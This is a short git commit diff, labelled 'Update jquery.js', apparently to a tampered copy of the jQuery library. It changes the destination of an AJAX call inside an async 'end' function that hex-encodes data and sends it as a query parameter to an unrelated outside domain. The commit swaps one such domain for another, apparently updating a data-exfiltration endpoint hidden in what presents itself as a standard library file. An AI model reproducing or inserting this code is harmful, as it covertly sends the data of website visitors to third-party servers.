7ead6568bbe0244b7758bf715d20a90427f77b53
systemyour2 <rscjay02@gmail.com>
2024-09-13 23:13:13 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://pusatjsbaru.infovpskuy.com/source/?json=" +
+                    "https://panelganz.clan4you-ws.online/source/?json=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
